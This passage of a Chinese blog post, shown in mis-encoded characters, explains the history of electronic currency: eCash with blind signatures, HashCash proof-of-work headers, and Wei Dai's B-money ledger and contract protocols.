<p>ã€7ã€‘<a href="https://link.zhihu.com/?target=http://www.tucaod.com/3990.html">http://www.tucaod.com/3990.html</a></p>
<p>ã€8ã€‘<a href="https://link.zhihu.com/?target=https://www.odaily.com/post/5133445">https://www.odaily.com/post/5133445</a></p>
<h1 id="åŒºå—é“¾æŠ€æœ¯2-ç”µå­è´§å¸çš„å†å²"><a href="#åŒºå—é“¾æŠ€æœ¯2-ç”µå­è´§å¸çš„å†å²" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯2:ç”µå­è´§å¸çš„å†å²"></a>åŒºå—é“¾æŠ€æœ¯2:ç”µå­è´§å¸çš„å†å²</h1><p>ä¸»è¦ä»‹ç»ä¸‰ç§ç”µå­è´§å¸ï¼Œåˆ†åˆ«æ˜¯eCashã€ HashCashå’ŒB-moneyã€‚</p>
<h2 id="eCash"><a href="#eCash" class="headerlink" title="eCash"></a>eCash</h2><p>ç›²ç­¾:ä¸€ç§ç‰¹æ®Šç±»å‹çš„æ•°å­—ç­¾åã€‚ä¸€èˆ¬æ•°å­—ç­¾åä¸­ï¼Œç­¾åè€…çŸ¥é“æ‰€ç­¾ç½²çš„æ¶ˆæ¯å†…å®¹ã€‚è€Œåœ¨ç›²ç­¾ä¸­ï¼Œç­¾åè€…å¯¹ä»–äººï¼ˆæ¥æ”¶è€…ï¼‰å‘æ¥çš„ä¿¡æ¯è¿›è¡Œç­¾åï¼Œæ¥æ”¶è€…é¦–å…ˆå¯¹åŸå§‹ä¿¡æ¯è¿›è¡Œç›²åŒ–ï¼Œç„¶åå‘é€ç»™ç­¾åè€…ï¼›ç­¾åè€…å¯¹ç›²åŒ–åçš„ä¿¡æ¯è¿›è¡Œç­¾åï¼›æ¥æ”¶è€…å¯ä»¥å¯¹è¿™ä¸ªç­¾ååçš„æ•°æ®å»ç›²åŒ–ï¼Œæœ€ç»ˆå¾—åˆ°ç­¾åè€…å…³äºåŸå§‹ä¿¡æ¯çš„æ­£ç¡®ç­¾åã€‚</p>
<p>ç›²ç­¾å®ä¾‹:</p>
<blockquote>
<p>ä¸€ä¸ªæ‰˜ç®¡äººæƒ³è¦ä¸¾è¡Œä¸€ä¸ªç§˜å¯†çš„é€‰ä¸¾ï¼Œä½†æ˜¯æŠ•ç¥¨äººä¸èƒ½èšåœ¨ä¸€èµ·å½“é¢åŒ¿åæŠ•ç¥¨ï¼Œåªèƒ½é€šè¿‡é‚®å¯„çš„æ–¹å¼å°†é€‰ç¥¨å¯„å‡ºã€‚æ¯ä¸ªæŠ•ç¥¨äººéƒ½éå¸¸å…³å¿ƒä¸èƒ½æ³„éœ²è‡ªå·±çš„æŠ•ç¥¨å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè¦æ±‚èƒ½å¤Ÿç¡®è®¤è‡ªå·±çš„æŠ•ç¥¨ç¡®å®ç”¨ä¸Šäº†ã€‚è€Œæ‰˜ç®¡äººä¹Ÿå¸Œæœ›èƒ½å¤Ÿä¿è¯åªæœ‰ç¡®å®šçš„ä¸€äº›äººå¯ä»¥æŠ•ç¥¨ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ä¸€ç§ç‰¹æ®Šçš„ä¿¡å°æ¥å®ç°ç›®çš„ã€‚æ¯ä¸ªæŠ•ç¥¨äººå°†è‡ªå·±çš„æŠ•ç¥¨å•è£…å…¥ä¸€ä¸ªå¤å†™çº¸è¡¬åº•çš„ä¿¡å°ï¼Œå°å¥½ï¼Œå¹¶ä¸”å°†è¿™ä¸ªä¿¡å°è£…å…¥å¦å¤–ä¸€ä¸ªå¤§ä¿¡å°ï¼Œåœ¨è¿™ä¸ªä¿¡å°çš„å¤–é¢æœ‰è‡ªå·±çš„å¯„å›åœ°å€ã€‚å½“æ‰˜ç®¡äººæ”¶åˆ°è¿™ä¸ªæœ‰åœ°å€çš„ä¿¡å°æ—¶ï¼Œå¯ä»¥æ‰“å¼€å¤§ä¿¡å°ï¼Œæ‹¿å‡ºæŠ•ç¥¨äººè‡ªå·±å°å¥½çš„æœ‰å¤å†™çº¸çš„ä¿¡å°ï¼Œç„¶ååœ¨ä¸æ‹†å°çš„æƒ…å†µä¸‹åœ¨ä¿¡å°å¤–ç­¾å­—ï¼Œæ­¤æ—¶ï¼Œé€šè¿‡å¤å†™çº¸ï¼Œä»–çš„ç­¾åä¹Ÿä¼ åˆ°äº†æŠ•ç¥¨å•ä¸Šï¼›ä¹Ÿå³ï¼Œåœ¨ä¸çŸ¥é“æŠ•ç¥¨å•å…·ä½“é•¿ä»€ä¹ˆæ ·çš„æƒ…å†µä¸‹ï¼Œæ‰˜ç®¡äººè¿›è¡Œäº†ç­¾å­—ã€‚ç­¾å¥½å­—ä¹‹åï¼Œå†å°†è¿™ä¸ªæœ‰å¤å†™çº¸çš„ä¿¡å°é‡æ–°è£…å…¥ä¸€ä¸ªæ–°çš„ä¿¡å°ï¼Œå¯„å›ç»™æŠ•ç¥¨äººã€‚æŠ•ç¥¨äººå¯ä»¥æ‹†å¼€æœ‰å¤å†™çº¸çš„ä¿¡å°ï¼Œæ‹¿å‡ºè‡ªå·±çš„æŠ•ç¥¨å•ï¼Œç„¶åå†™å¥½æŠ•ç¥¨å†…å®¹ï¼Œåœ¨é€‰ä¸¾çš„æ—¥æœŸå¯„ç»™æ‰˜ç®¡äººï¼Œå¹¶ä¸”ä¸æ ‡æ³¨ä»»ä½•ä¸ªäººä¿¡æ¯ã€‚</p>
<p>å½“æ‰˜ç®¡äººæ”¶åˆ°æ‰€æœ‰æŠ•ç¥¨äººçš„åŒ¿åæŠ•ç¥¨æ—¶ï¼Œä»–èƒ½å¤Ÿé€šè¿‡æŠ•ç¥¨å•ä¸Šçš„ç­¾åç¡®è®¤åªæœ‰é€‰å®šçš„æŠ•ç¥¨äººæ‰èƒ½æŠ•ç¥¨ï¼›è€ŒæŠ•ç¥¨äººä¹Ÿå¯ä»¥æ ¹æ®åªæœ‰è‡ªå·±æ‰€çŸ¥é“çš„æŠ•ç¥¨å•ä¸Šçš„ä¿¡æ¯ï¼ˆå› ä¸ºæŠ•ç¥¨å•æ˜¯æŠ•ç¥¨äººè‡ªå·±æ‰€é€‰çš„ï¼‰ç¡®è®¤è‡ªå·±çš„æŠ•ç¥¨æ˜¯å¦èµ·ä½œç”¨äº†ã€‚</p>
</blockquote>
<p>eCashç³»ç»Ÿéœ€è¦æœ‰ä¸­å¿ƒé“¶è¡Œç³»ç»Ÿï¼Œç”¨æˆ·åœ¨é“¶è¡Œä¸­æœ‰å­˜æ¬¾ï¼Œå¯ä»¥å‘é“¶è¡Œæå–ç”µå­è´§å¸ã€‚ä¸ºäº†é˜²æ­¢é“¶è¡Œç³»ç»Ÿè¿½è¸ªç”µå­è´§å¸çš„ä½¿ç”¨æƒ…å†µï¼Œç”¨æˆ·çš„éšç§æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ç›²ç­¾åã€‚åˆ†ä¸ºå–æ¬¾ã€æ”¯ä»˜å’Œå…‘ç°è¿‡ç¨‹ã€‚</p>
<ol>
<li><p>å–æ¬¾è¿‡ç¨‹</p>
<ul>
<li>U ï¼ˆUserï¼Œç”¨æˆ·ï¼‰ç”¨èº«ä»½è®¤è¯åè®®å‘Bï¼ˆbankï¼Œé“¶è¡Œï¼‰è¯æ˜èº«ä»½</li>
<li>Uå°†Nä»½ç”µå­ç°é‡‘æ–‡ä»¶m(å†…å«é‡‘é¢ï¼ˆå¦‚100å…ƒï¼‰ã€ç”¨æˆ·IDåŠå”¯ä¸€çš„éšæœºæ•°ç­‰ä¿¡æ¯)ç”¨ä¸åŒçš„ç›²å› å­ç›²åŒ–åäº¤ç»™Bï¼›ï¼ˆå”¯ä¸€çš„éšæœºæ•°ç›¸å½“äºæ˜¯ç°é‡‘è´§å¸ä¸­çš„ç¼–å·ï¼›ï¼‰</li>
<li>Béšæœºé€‰æ‹©ä¸€éƒ¨åˆ†(å¦‚ï¼šN-1ä¸ª)æ–‡ä»¶ï¼Œå‘U ç´¢è¦ç›²å› å­ï¼Œæ¢å¤å‡ºæ–‡ä»¶(å»ç›²)ï¼Œå®¡æŸ¥å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œå¦‚æ˜¯å¦æ‰€æœ‰çš„æ–‡ä»¶ä¸­éƒ½æ˜¯100å…ƒ</li>
<li>å¦‚æœå®¡æŸ¥é€šè¿‡ï¼ŒBä»æœªå®¡æŸ¥çš„æ–‡ä»¶ä¸­ä»»å–ä¸€ä»½ç›²ç­¾åï¼Œå¹¶å‘ç»™Uï¼Œä»U çš„å¸æˆ·ä¸­å‡å»ç›¸åº”é‡‘é¢ï¼›å¦åˆ™åè®®ç»ˆæ­¢ï¼›ï¼ˆè¿™æ ·ï¼Œè™½ç„¶é“¶è¡Œå¯¹Bçš„100å…ƒè´§å¸è¿›è¡Œäº†ç­¾åï¼Œä¹Ÿå°±æ˜¯æ‹…ä¿ï¼Œä½†æ˜¯é“¶è¡Œå¹¶ä¸ç¡®å®šBæ‰€æ‹¥æœ‰çš„è´§å¸ç¼–å·æ˜¯å“ªä¸€ä¸ªï¼Œä»è€Œæ— æ³•å¯¹ç”¨æˆ·çš„æ¶ˆè´¹è¡Œä¸ºè¿›è¡Œè·Ÿè¸ªï¼‰</li>
<li>Uå¯¹æ”¶åˆ°çš„ç­¾åæ–‡ä»¶å»ç›²ï¼Œå¾—åˆ°ç”µå­ç°é‡‘ï¼ˆè¿™ä¸ªç”µå­ç°é‡‘å¯ä»¥åƒç°é‡‘ä¸€æ ·ä½¿ç”¨ï¼›è€Œä¸”é“¶è¡Œä¸èƒ½è¿½è¸ªï¼›ä½†æ˜¯ç”¨æˆ·å¯ä»¥è‡ªå·±ä¿å­˜å¹¶è®°å½•ï¼Œä»¥åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œè¯æ˜è¿™å¼ é’ç¥¨çš„å»å‘ï¼Œè­¬å¦‚è´¿èµ‚ç­‰çŠ¯ç½ªåœºæ™¯ï¼‰ã€‚</li>
</ul>
</li>
<li><p>æ”¯ä»˜</p>
<ul>
<li>U ä¸Cäº¤æ˜“æ—¶ï¼ŒæŠŠç”µå­ç°é‡‘äº¤ç»™C</li>
<li>CéªŒè¯Bçš„ç­¾åï¼Œå¦‚æ˜¯ä¼ªé€ çš„ï¼Œåˆ™æ‹’æ”¶ï¼›å¦åˆ™è¿›ä¸€æ­¥æ£€æµ‹ç”¨æˆ·(å¯é€‰)ï¼Œé€šè¿‡åæ¥å—ç”µå­ç°é‡‘ï¼Œæä¾›ç­‰ä»·çš„æœåŠ¡ã€‚</li>
</ul>
</li>
<li><p>å–æ¬¾</p>
<ul>
<li>Cå‘Bé€’äº¤ç”µå­ç°é‡‘å’Œå¸æˆ·ä¿¡æ¯</li>
<li>BéªŒè¯ç­¾åï¼Œè‹¥æ˜¯ä¼ªé€ çš„ï¼Œåˆ™æ‹’æ”¶ï¼›å¦åˆ™æŸ¥è¯¢æ•°æ®åº“æ˜¯å¦æœ‰ç›¸åŒçš„ç­¾å(é˜²æ­¢é‡å¤ä½¿ç”¨ç”µå­ç°é‡‘)ï¼Œè‹¥æ‰¾åˆ°åˆ™Cæˆ–U é‡ç”¨ç”µå­ç°é‡‘ï¼Œæ‹’æ”¶ï¼›å¦åˆ™æ¥å—ï¼Œåœ¨Cçš„å¸æˆ·ä¸­åŠ ä¸Šç›¸åº”é‡‘é¢ï¼Œåœ¨æ•°æ®åº“ä¸­æ·»åŠ ç­¾åã€‚</li>
</ul>
</li>
</ol>
<h2 id="HashCash"><a href="#HashCash" class="headerlink" title="HashCash"></a>HashCash</h2><p>ç»´åŸºç™¾ç§‘:</p>
<blockquote>
<p>â€œå“ˆå¸Œç°é‡‘ï¼ˆHashcashï¼‰æ˜¯ä¸€ç§ç”¨äºé˜²æ­¢åƒåœ¾ç”µå­é‚®ä»¶å’Œæ‹’ç»æœåŠ¡æ”»å‡»çš„å·¥ä½œé‡è¯æ˜ç³»ç»Ÿï¼Œæœ€è¿‘ä»¥å…¶åœ¨æ¯”ç‰¹å¸ï¼ˆä»¥åŠå…¶ä»–åŠ å¯†è´§å¸ï¼‰æŒ–çŸ¿ç®—æ³•ä¸­çš„åº”ç”¨è€Œé—»åï¼Œç”±Adam Backäº1997å¹´3æœˆæå‡ºã€‚â€</p>
</blockquote>
<p>HashCashä¸»è¦æ€è·¯:</p>
<p>é€šè¿‡è¦æ±‚åœ¨é‚®ä»¶å‘é€ä¹‹å‰ï¼Œå¿…é¡»è¿›è¡Œè®¡ç®—ï¼Œè­¬å¦‚ï¼Œé€šè¿‡å¯¹ä¸€å°ç”µå­é‚®ä»¶è¿›è¡Œå“ˆå¸Œå¾—åˆ°æŒ‡å®šçš„åŒ…å«ä¸€äº›å­—ç¬¦ä¸²çš„æ•£åˆ—å€¼ï¼Œè¯æ˜ä¸ºäº†å‘é€é‚®ä»¶ï¼Œè®¡ç®—æœºç¡®å®èŠ±è´¹äº†ä¸€äº›æ—¶é—´æˆ–èƒ½é‡åœ¨ç‰¹å®šçš„ç®—æ³•ä¸Šï¼Œä»è€Œâ€œè¯æ˜â€è¿™æ˜¯åˆæ³•çš„é‚®ä»¶ã€‚</p>
<p>å…·ä½“å®ç°:</p>
<p>æ ‡é¢˜è¡Œçœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p>
<p><code>X-Hashcash: 1:20:1303030600:adam@cypherspace.org::McMybZIhxKXu57jd:ckvi</code></p>
<p>æ ‡é¢˜åŒ…å«:</p>
<ul>
<li>verï¼šHashcashæ ¼å¼ç‰ˆæœ¬1ï¼ˆå–ä»£ç‰ˆæœ¬0ï¼‰ã€‚</li>
<li>bitsï¼šæ•£åˆ—ä»£ç ä¸­çš„é›¶çš„ä½æ•°ã€‚</li>
<li>dateï¼šå‘é€æ¶ˆæ¯çš„æ—¶é—´ï¼Œæ ¼å¼ä¸ºYYMMDD [hhmm [ss]]ã€‚</li>
<li>resourceï¼šæ¥æ”¶æ–¹ï¼Œä¾‹å¦‚IPåœ°å€æˆ–ç”µå­é‚®ä»¶åœ°å€ã€‚</li>
<li>extï¼šæ‰©å±•ï¼ˆå¯é€‰ï¼›åœ¨ç‰ˆæœ¬1ä¸­å¿½ç•¥ï¼‰ã€‚</li>
<li>randï¼šéšæœºå­—ç¬¦ä¸²ï¼Œä»¥base-64æ ¼å¼ç¼–ç ã€‚</li>
<li>counterï¼šäºŒè¿›åˆ¶è®¡æ•°å™¨ï¼Œä»¥base-64æ ¼å¼ç¼–ç ã€‚</li>
</ul>
<p>å‘é€æ–¹å…·ä½“æ“ä½œ:</p>
<p>å‘é€æ–¹å‡†å¤‡æ ‡é¢˜å¤´å¹¶é™„åŠ ä¸Šåˆå§‹åŒ–ä¸ºéšæœºæ•°çš„è®¡æ•°å™¨å€¼ï¼ˆcounterï¼‰ã€‚ç„¶åå®ƒè®¡ç®—å¤´çš„160ä½SHA-1å“ˆå¸Œå€¼ã€‚å¦‚æœæ•£åˆ—çš„å‰20ä½ï¼ˆå³5ä¸ªæœ€é«˜æœ‰æ•ˆåå…­è¿›åˆ¶æ•°å­—ï¼‰éƒ½æ˜¯é›¶ï¼Œé‚£ä¹ˆè¿™æ˜¯å¯æ¥å—çš„æ ‡é¢˜å¤´ã€‚å¦‚æœä¸æ˜¯ï¼Œåˆ™å‘é€æ–¹é€’å¢è®¡æ•°å™¨å¹¶å†æ¬¡å°è¯•æ•£åˆ—ã€‚åœ¨2^160ä¸ªå¯èƒ½çš„æ•£åˆ—å€¼ä¸­ï¼Œæœ‰2^140ä¸ªæ•£åˆ—å€¼æ»¡è¶³æ­¤æ ‡å‡†ã€‚å› æ­¤ï¼Œéšæœºé€‰æ‹©å°†å…·æœ‰20ä¸ªé›¶ä½œä¸ºæ•£åˆ—å¼€å¤´çš„æ ‡é¢˜çš„æœºä¼šæ˜¯2^20åˆ†ä¹‹ä¸€ï¼ˆ2^20å¤§çº¦10^6ï¼Œæˆ–å¤§çº¦ç™¾ä¸‡åˆ†ä¹‹ä¸€ï¼‰ã€‚å‘é€è€…éœ€è¦å°è¯•ä»¥è·å–æœ‰æ•ˆå“ˆå¸Œå€¼çš„æ¬¡æ•°ç¬¦åˆå‡ ä½•åˆ†å¸ƒæ¨¡å‹ã€‚å› æ­¤ï¼Œå‘é€æ–¹å¹³å‡å¿…é¡»å°è¯•2^20ä¸ªå€¼æ‰èƒ½æ‰¾åˆ°æœ‰æ•ˆçš„æ ‡é¢˜å¤´ã€‚å¦‚æœåˆç†ä¼°è®¡è®¡ç®—å“ˆå¸Œæ‰€éœ€çš„æ—¶é—´ï¼Œåˆ™éœ€è¦å¤§çº¦ä¸€ç§’é’Ÿæ‰èƒ½æ‰¾åˆ°ã€‚æ²¡æœ‰æ¯”è¿™ç§æš´åŠ›ç ´è§£æ–¹æ³•æ›´æœ‰æ•ˆçš„æ–¹æ³•æ¥æ‰¾åˆ°æœ‰æ•ˆçš„æ ‡é¢˜å¤´ã€‚</p>
<p>æ™®é€šç”¨æˆ·ä¸ä¼šå› ç”ŸæˆHashcashå­—ç¬¦ä¸²æ‰€éœ€çš„å¤„ç†æ—¶é—´è€Œæ„Ÿåˆ°æ˜æ˜¾çš„é—®é¢˜ã€‚ä½†æ˜¯ï¼Œåƒåœ¾é‚®ä»¶å‘é€è€…å› ä¸ºå‘é€å¤§é‡åƒåœ¾é‚®ä»¶ï¼Œä¼šå¤§å¤§å‡æ…¢é€Ÿåº¦ã€‚</p>
<p>æ¥å—è€…å…·ä½“æ“ä½œ:</p>
<p>HA-1å“ˆå¸Œå€¼ï¼ˆä¾‹å¦‚ï¼Œâ€œ1ï¼š20ï¼š060408ï¼š<a href="mailto:&#x61;&#100;&#97;&#x6d;&#64;&#99;&#x79;&#x70;&#x68;&#x65;&#x72;&#115;&#x70;&#97;&#x63;&#101;&#46;&#x6f;&#114;&#103;">&#x61;&#100;&#97;&#x6d;&#64;&#99;&#x79;&#x70;&#x68;&#x65;&#x72;&#115;&#x70;&#97;&#x63;&#101;&#46;&#x6f;&#114;&#103;</a> :: 1QTjaYd7niiQA &#x2F; scï¼šePaâ€ï¼‰ã€‚è¿™åœ¨1 GHzæœºå™¨ä¸Šå¤§çº¦éœ€è¦2å¾®ç§’ï¼Œè¿œè¿œå°‘äºæ¥æ”¶å…¶ä½™ç”µå­é‚®ä»¶æ‰€éœ€çš„æ—¶é—´ã€‚å¦‚æœå‰20ä½ä¸å…¨ä¸ºé›¶ï¼Œåˆ™æ•£åˆ—æ— æ•ˆã€‚ ï¼ˆéšç€æœºå™¨å¤„ç†é€Ÿåº¦çš„æé«˜ï¼Œä»¥åçš„ç‰ˆæœ¬å¯èƒ½éœ€è¦æ›´å¤šçš„ä½ä¸ºé›¶ã€‚ï¼‰</p>
<p>æ”¶ä»¶äººçš„è®¡ç®—æœºæ£€æŸ¥æ ‡é¢˜ä¸­çš„æ—¥æœŸï¼ˆä¾‹å¦‚ï¼Œâ€œ060408â€ï¼Œè¡¨ç¤º2006å¹´4æœˆ8æ—¥çš„æ—¥æœŸï¼‰ã€‚å¦‚æœä¸åœ¨å½“å‰æ—¥æœŸçš„ä¸¤å¤©å†…ï¼Œåˆ™æ— æ•ˆã€‚ ï¼ˆä¸¤å¤©çš„çª—å£å¯ä»¥è¡¥å¿ä¸åŒç³»ç»Ÿä¹‹é—´çš„æ—¶é’Ÿåå·®å’Œç½‘ç»œè·¯ç”±æ—¶é—´ã€‚ï¼‰</p>
<p>æ”¶ä»¶äººçš„è®¡ç®—æœºæ£€æŸ¥å“ˆå¸Œå­—ç¬¦ä¸²ä¸­çš„ç”µå­é‚®ä»¶åœ°å€æ˜¯å¦ä¸æ”¶ä»¶äººæ³¨å†Œçš„ä»»ä½•æœ‰æ•ˆç”µå­é‚®ä»¶åœ°å€åŒ¹é…ï¼Œæˆ–è€…ä¸æ”¶ä»¶äººè®¢é˜…çš„ä»»ä½•é‚®ä»¶åˆ—è¡¨åŒ¹é…ã€‚å¦‚æœæœªæ‰¾åˆ°åŒ¹é…é¡¹ï¼Œåˆ™å“ˆå¸Œå­—ç¬¦ä¸²æ— æ•ˆã€‚</p>
<p>æ”¶ä»¶äººçš„è®¡ç®—æœºå°†å“ˆå¸Œå­—ç¬¦ä¸²æ’å…¥æ•°æ®åº“ã€‚å¦‚æœå­—ç¬¦ä¸²å·²ç»åœ¨æ•°æ®åº“ä¸­ï¼ˆè¡¨ç¤ºæ­£åœ¨å°è¯•é‡æ–°ä½¿ç”¨å“ˆå¸Œå­—ç¬¦ä¸²ï¼‰ï¼Œåˆ™è¯¥å­—ç¬¦ä¸²æ— æ•ˆã€‚</p>
<p>å¦‚æœæ•£åˆ—å­—ç¬¦ä¸²é€šè¿‡æ‰€æœ‰è¿™äº›æµ‹è¯•ï¼Œåˆ™è®¤ä¸ºå®ƒæ˜¯æœ‰æ•ˆçš„æ•£åˆ—å­—ç¬¦ä¸²ã€‚æ‰€æœ‰è¿™äº›æµ‹è¯•æ‰€èŠ±è´¹çš„æ—¶é—´å’Œç£ç›˜ç©ºé—´è¿œè¿œå°‘äºæ¥æ”¶ç”µå­é‚®ä»¶çš„æ­£æ–‡å†…å®¹ã€‚</p>
<h2 id="B-money"><a href="#B-money" class="headerlink" title="B-money"></a>B-money</h2><p>åœ¨B-Moneyçš„æƒ³æ³•ä¸­ï¼ŒWeiæå‡ºäº†ä¸¤ä¸ªåè®®ã€‚</p>
<p>åœ¨ç¬¬ä¸€ä¸ªåè®®ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½ç»´æŠ¤ä¸€ä¸ªæ•°æ®åº“ï¼ˆ<strong>å› ä¸ºæ¯ä¸ªäººéƒ½æ‹¥æœ‰ä¸€ä»½æ•°æ®åº“ï¼Œæ‰€ä»¥ä¸­å¿ƒæœºæ„è¢«ç§»é™¤äº†</strong>ï¼‰ï¼Œæ•°æ®åº“ä¸­è®°å½•æ¯ä¸€ä¸ªå‡åï¼ˆç”¨æˆ·çš„å…¬é’¥ï¼‰ä¸­æœ‰å¤šå°‘é’±ã€‚è¿™äº›ä¿¡æ¯æ„æˆäº†ä¸€ä¸ªå¸ç°¿ï¼Œé‡ç‚¹å°±æ˜¯å¦‚ä½•æ›´æ–°è¿™äº›å¸ç°¿ã€‚</p>
<ol>
<li><p>åˆ›å»ºé’±ã€‚æ¯ä¸ªç”¨æˆ·å¯ä»¥é€šè¿‡å¹¿æ’­å¯¹ä»¥å‰æœªè§£å†³çš„è®¡ç®—é—®é¢˜çš„ç­”æ¡ˆæ¥è·å¾—é’±ã€‚è¿™æ ·çš„è®¡ç®—çš„æ¡ä»¶æ˜¯å¿…é¡»å¾ˆå®¹æ˜“ç¡®å®šè§£å†³è¿™ä¸ªé—®é¢˜æ‰€éœ€è¦çš„ç®—åŠ›ï¼Œè§£é¢˜æ‰€è·å¾—çš„é’±ä¸æ‰€ä»˜å‡ºçš„ç®—åŠ›æ¢ç®—æˆä¸€ç¯®å­è´§ç‰©çš„ä»·å€¼ç›¸ç­‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€é“é¢˜åœ¨æœ€ç»æµçš„çš„æƒ…å†µä¸‹èŠ±äº†100å°æ—¶çš„ç®—åŠ›ï¼Œè€Œå¸‚åœºä¸Šéœ€è¦èŠ±3ç¯®å­çš„è´§ç‰©æ¥è´­ä¹°è¿™100å°æ—¶çš„ç®—åŠ›ï¼Œé‚£ä¹ˆè§£å¼€è¿™é“é¢˜äº§ç”Ÿçš„è´§å¸æ˜¯3ä¸ªå•ä½ã€‚</p>
</li>
<li><p>è½¬è´¦ã€‚å¦‚æœAliceï¼ˆå…¬é’¥Aï¼ŒK_A<em>ï¼‰</em>å†³å®šå‘Bobï¼ˆå…¬é’¥Bï¼ŒK_Bï¼‰è½¬Xå•ä½çš„é’±ï¼Œé‚£ä¹ˆå¥¹å‘é€ä¸€æ¡å¹¿æ’­æ¶ˆæ¯â€æˆ‘å°†ç»™K_B Xå•ä½çš„é’±â€œã€‚åœ¨å¹¿æ’­äº†è¿™ä¸ªæ¶ˆæ¯åï¼Œç³»ç»Ÿä¸­çš„æ¯ä¸ªç”¨æˆ·å°†K_Aç”¨æˆ·ä¸­çš„é’±æ‰£é™¤Xå•ä½ï¼›åŒæ—¶å°†Bè´¦æˆ·å¢åŠ Xå•ä½ã€‚ï¼ˆé™¤éä¼šå¯¼è‡´Aç”¨æˆ·ä¸ºè´Ÿï¼‰</p>
<blockquote>
<p>è¿›ä¸€æ­¥è§£é‡Š:</p>
<p>å¦‚æœAliceå’ŒBobéƒ½æ˜¯éƒ½æ˜¯b-moneyçš„ç”¨æˆ·ï¼Œé‚£ä¹ˆä»–ä»¬éƒ½æ‹¥æœ‰å…¬ç§é’¥å¯¹ã€‚åœ¨éå¯¹ç§°å¯†ç ä½“ç³»ä¸­ï¼Œå…¬é’¥æ˜¯å…¬å¼€çš„ï¼Œæ‰€æœ‰äººå¯è§ã€‚å…¬é’¥åŠ å¯†ï¼Œç§é’¥ç­¾åã€‚åœ¨æ‰€æœ‰ç”¨æˆ·å…±åŒç»´æŠ¤çš„è´¦ç°¿ä¸­ï¼Œä»–ä»¬çš„å…¬é’¥ä»£è¡¨ä»–ä»¬çš„èº«ä»½ã€‚</p>
<p>åŠ å…¥Aliceå†³å®šå‘Bobå‘2ä¸ªå•ä½çš„é’±ï¼Œé‚£ä¹ˆAliceå°±ä¼šå¹¿æ’­ç”¨è‡ªå·±çš„ç§é’¥ç­¾åçš„æ¶ˆæ¯â€œä»K_Aå‘é€2ä¸ªå•ä½çš„é’±åˆ°K_Bã€‚â€è¿™æ¡ç­¾åçš„ä¿¡æ¯å‘æ‰€æœ‰b-moneyç”¨æˆ·è¯æ˜ï¼Œå…¬é’¥Açš„ä¸»äººæƒ³è¦å°†2ä¸ªå•ä½é’±å‘é€ç»™å…¬é’¥Bã€‚å› æ­¤æ‰€æœ‰äººéƒ½ä¼šæ›´æ–°ä»–ä»¬çš„è´¦ç°¿ã€‚</p>
</blockquote>
</li>
<li><p>åˆåŒçš„å½±å“ã€‚æœ‰æ•ˆåˆåŒå¿…é¡»åŒ…æ‹¬æœ€å¤§èµ”å¿ï¼Œä»¥é˜²æ¯ä¸ªå‚ä¸æ–¹è¿çº¦ã€‚å®ƒè¿˜åº”åŒ…æ‹¬ä¸€ä¸ªåœ¨å‘ç”Ÿäº‰è®®æ—¶å°†è¿›è¡Œä»²è£çš„ä¸€æ–¹ã€‚åˆåŒçš„æ‰€æœ‰å„æ–¹ï¼ˆåŒ…æ‹¬ä»²è£å‘˜ï¼‰å¿…é¡»åœ¨å…¶ç”Ÿæ•ˆä¹‹å‰å¹¿æ’­å…¶ç­¾åã€‚åœ¨åˆåŒå’Œæ‰€æœ‰ç­¾åçš„å¹¿æ’­ä¹‹åï¼Œæ¯ä¸ªå‚ä¸è€…ä»¥å…¶æœ€é«˜èµ”å¿é‡‘é¢å€Ÿè®°æ¯ä¸€æ–¹çš„è´¦æˆ·ï¼Œå¹¶å°†ç”±åˆåŒçš„å®‰å…¨æ•£åˆ—æ ‡è¯†çš„ç‰¹æ®Šè´¦æˆ·è®°å…¥æœ€å¤§èµ”å¿é‡‘é¢ã€‚ã€ä¹Ÿå³ä¿å­˜åˆ°å®‰å…¨è´¦æˆ·ã€‘å¦‚æœæ¯æ–¹çš„å€Ÿè®°æˆåŠŸè€Œæ²¡æœ‰äº§ç”Ÿè´Ÿä½™é¢ï¼Œåˆ™åˆåŒç”Ÿæ•ˆï¼Œå¦åˆ™åˆåŒå°†è¢«å¿½ç•¥ï¼Œè´¦æˆ·å°†è¢«å›æ»šã€‚ç¤ºä¾‹åˆåŒå¦‚ä¸‹:</p>
<blockquote>
<p>K_AåŒæ„åœ¨0ï¼š0ï¼š0 1&#x2F;1&#x2F;2000ä¹‹å‰å‘K_Bå‘é€é—®é¢˜Pçš„è§£ã€‚ K_BåŒæ„åœ¨0ï¼š0ï¼š0 1&#x2F;1&#x2F;2000ä¹‹å‰æ”¯ä»˜K_A 100 MUï¼ˆè´§å¸å•ä½ï¼‰ã€‚ K_CåŒæ„åœ¨å‘ç”Ÿäº‰è®®æ—¶è¿›è¡Œä»²è£ã€‚ K_AåŒæ„åœ¨è¿çº¦çš„æƒ…å†µä¸‹æ”¯ä»˜æœ€å¤š1000 MUã€‚ K_BåŒæ„åœ¨è¿çº¦çš„æƒ…å†µä¸‹æ”¯ä»˜æœ€å¤š200 MUã€‚ K_CåŒæ„åœ¨è¿çº¦çš„æƒ…å†µä¸‹æ”¯ä»˜æœ€å¤š500 MUã€‚</p>
</blockquote>
</li>
<li><p>ç­¾è®¢åˆåŒã€‚å¦‚æœåˆåŒæ— äº‰è®®åœ°ç»“æŸï¼Œåˆ™å„æ–¹å¹¿æ’­ä¸€æ¡ç­¾åæ¶ˆæ¯â€œä¸SHA-1å“ˆå¸ŒHç­¾è®¢çš„åˆåŒæ— éœ€èµ”å¿å³å¯ç»“æŸâ€ã€‚æˆ–è€…å¯èƒ½â€œä¸SHA-1å“ˆå¸ŒHçš„åˆåŒä»¥ä¸‹åˆ—èµ”å¿ç»“æŸï¼šâ€¦â€¦â€åœ¨æ‰€æœ‰ç­¾åçš„å¹¿æ’­ä¸­ï¼Œæ¯ä¸ªå‚ä¸è€…æŒ‰å…¶æœ€é«˜èµ”å¿é‡‘é¢è®¡å…¥æ¯ä¸€æ–¹çš„è´¦æˆ·ï¼Œåˆ é™¤åˆåŒè´¦æˆ·ï¼Œç„¶åå¦‚æœå­˜åœ¨ï¼Œåˆ™æ 